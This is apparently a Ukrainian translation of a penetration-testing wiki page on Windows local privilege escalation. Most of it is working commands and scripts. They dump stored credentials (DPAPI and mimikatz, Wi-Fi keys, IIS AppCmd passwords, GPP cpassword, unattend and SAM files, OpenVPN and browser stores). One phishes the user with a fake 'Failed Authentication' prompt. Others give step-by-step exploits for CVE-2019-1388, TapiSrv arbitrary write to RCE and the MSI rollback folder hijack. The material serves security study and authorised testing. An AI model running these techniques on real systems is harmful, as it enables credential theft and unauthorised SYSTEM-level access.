Зашифровані RSA-ключі користувача, за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` позначає [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом із master key, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст неможливо переглянути за допомогою команди `dir` у CMD, хоча це можна зробити через PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **mimikatz module** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc)`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем**, зазвичай розташовані в:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягнути багато **masterkeys** DPAPI з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви маєте права root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптингу** та завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп’ютері, на якому їх було створено.

Щоб **розшифрувати** PS credentials із файлу, який їх містить, можна виконати:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Диспетчер облікових даних віддаленого робочого стола**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль `dpapi::rdg` **Mimikatz** із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля `sekurlsa::dpapi` **Mimikatz** можна **витягти багато головних ключів DPAPI** з пам’яті

### Sticky Notes

Користувачі часто застосовують програму StickyNotes на робочих станціях Windows для **збереження паролів** та іншої інформації, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, і його завжди варто пошукати та перевірити.

### AppCmd.exe

**Зверніть увагу, що для відновлення паролів з AppCmd.exe потрібно мати права Administrator і запускати його з рівнем High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, були налаштовані певні **облікові дані**, які можна **відновити**.

Цей код було взято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них уразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та реєстр (облікові дані)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Ключі SSH-хостів Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому слід перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, що ця техніка більше не є актуальною. Я спробував створити кілька ssh-ключів, додати їх за допомогою `ssh-add` і виконати вхід через ssh на машину. Розділ реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Unattended-файли
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM і SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Облікові дані Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Знайдіть файл під назвою **SiteList.xml**

### Cached GPP Password

Раніше була доступна функція, яка дозволяла розгортати спеціальні локальні облікові записи адміністраторів на групі машин через Group Policy Preferences (GPP). Однак цей метод мав значні вразливості безпеки. По-перше, Group Policy Objects (GPO), що зберігалися як XML-файли в SYSVOL, могли бути доступними будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із використанням загальнодоступного документованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Для зменшення цього ризику було розроблено функцію пошуку локально кешованих GPP-файлів, що містять непорожнє поле "cpassword". У разі виявлення такого файлу функція розшифровує пароль і повертає спеціальний об'єкт PowerShell. Цей об'єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.

Виконайте пошук у `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ таких файлів:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Облікові дані OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Журнали
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що безпосередньо **запитувати** клієнта про **облікові дані** справді **ризиковано**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які свого часу містили **паролі** у **відкритому вигляді** або у форматі **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Виконайте пошук у всіх запропонованих файлах:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в Кошику

Також слід перевірити Кошик на наявність облікових даних у ньому

Щоб **відновити паролі**, збережені різними програмами, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Потрібно перевірити dbs, де зберігаються паролі від **Chrome або Firefox**.\
Також перевірте історію, закладки та вибране браузерів — можливо, там зберігаються **паролі**.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен COM-компонент **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

COM-класи та інтерфейси визначені в реєстрі відповідно в **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення під назвою **ThreadingModel**, яке може мати значення **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно- або багатопотоковий) або **Neutral** (нейтральний щодо потоків).

![Історія браузерів - COM DLL Overwriting: Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

По суті, якщо ви можете **перезаписати будь-яку DLL**, яка буде виконана, ви зможете **підвищити привілеї**, якщо цю DLL буде виконано від імені іншого користувача.

Щоб дізнатися, як attackers використовують COM Hijacking як механізм persistence, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу з певним іменем**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Пошук назв ключів і паролів у реєстрі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти, що шукають паролі

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив для **автоматичного виконання кожного metasploit POST-модуля, що шукає облікові дані** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Витік дескрипторів

Уявімо, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **з повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але з успадкуванням усіх відкритих дескрипторів головного процесу**.\
Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор привілейованого процесу, створений** за допомогою `OpenProcess()`, і **впровадити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Прочитайте цей **інший допис із детальнішим поясненням того, як перевіряти та використовувати додаткові відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імітація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **каналами**, забезпечують взаємодію процесів і передавання даних.

Windows має функцію під назвою **Named Pipes**, яка дозволяє непов’язаним процесам обмінюватися даними навіть через різні мережі. Це нагадує архітектуру клієнт/сервер, де ролі визначаються як **сервер named pipe** і **клієнт named pipe**.

Коли **клієнт** надсилає дані через канал, **сервер**, який створив цей канал, може **прийняти ідентичність** **клієнта**, якщо має необхідні права **SeImpersonate**. Виявлення **привілейованого процесу**, який взаємодіє через канал, що його можна імітувати, дає змогу **отримати вищі привілеї**, прийнявши ідентичність цього процесу після його взаємодії зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати взаємодію через named pipe за допомогою інструмента на кшталт burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу переглядати список усіх каналів, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як служба. Повний процес:

- `ClientAttach` із `pszDomainUser`, що вказує на наявний шлях, доступний для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для запису асинхронних подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструйте line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0)`), а потім скасуйте реєстрацію/завершіть роботу, щоб повторювати детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключіться, а потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати дії у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби візуалізації Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть активувати небезпечні обробники URI (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконати контрольовані зловмисником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Під час отримання shell від імені користувача можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів із процесів

## Від непривілейованого користувача до NT\AUTHORITY SYSTEM (CVE-2019-1388) / обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP), а UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейованого користувача.

Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи ту саму вразливість. Крім того, немає потреби щось встановлювати, а бінарний файл, що використовується під час процесу, підписаний і виданий Microsoft.

Деякі з уражених систем:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
У вас є вся необхідна інформація та файли в наступному GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від середнього рівня цілісності Administrator до високого рівня цілісності / UAC Bypass

Прочитайте це, щоб **дізнатися про Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка, описана [**у цьому blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з exploit code, [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Атака полягає у використанні функції rollback Windows Installer для заміни легітимних файлів шкідливими під час процесу деінсталяції. Для цього attacker повинен створити **шкідливий MSI installer**, який використовуватиметься для hijack папки `C:\Config.Msi`. Згодом Windows Installer використовуватиме її для зберігання rollback-файлів під час деінсталяції інших MSI packages, причому rollback-файли буде змінено так, щоб вони містили шкідливий payload.

Узагальнена техніка виглядає так:

1. **Етап 1 — Підготовка до hijack (залишити `C:\Config.Msi` порожньою)**

- Крок 1: Встановлення MSI
- Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у папку, доступну для запису (`TARGETDIR`).
- Позначте installer як **"UAC Compliant"**, щоб його міг запустити **не-адміністратор**.
- Після встановлення залиште **handle** відкритим для файлу.

- Крок 2: Початок деінсталяції
- Видаліть той самий `.msi`.
- Процес деінсталяції починає переміщувати файли до `C:\Config.Msi` та перейменовувати їх на файли `.rbf` (rollback backups).
- **Опитуйте відкритий file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Custom Syncing
- `.msi` містить **custom uninstall action (`SyncOnRbfWritten`)**, яка:
- Сигналізує, коли `.rbf` було записано.
- Потім очікує на іншу подію перед продовженням деінсталяції.

- Крок 4: Блокування видалення `.rbf`
- Після отримання сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дозволить його видалити**.
- Потім **надішліть сигнал у відповідь**, щоб деінсталяція могла завершитися.
- Windows Installer не може видалити `.rbf`, а оскільки він не може видалити весь вміст, `C:\Config.Msi` не видаляється.

- Крок 5: Ручне видалення `.rbf`
- Ви (attacker) вручну видаляєте файл `.rbf`.
- Тепер **`C:\Config.Msi` порожня**, і її можна захопити.

> На цьому етапі **активуйте vulnerability довільного видалення папки на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — Заміна rollback scripts на шкідливі**

- Крок 6: Повторне створення `C:\Config.Msi` зі слабкими ACL
- Створіть папку `C:\Config.Msi` самостійно.
- Встановіть **слабкі DACL** (наприклад, Everyone:F) і **залиште handle відкритим** із `WRITE_DAC`.

- Крок 7: Запуск іншого встановлення
- Знову встановіть `.msi` із такими параметрами:
- `TARGETDIR`: Location, доступна для запису.
- `ERROROUT`: Variable, яка спричиняє примусову помилку.
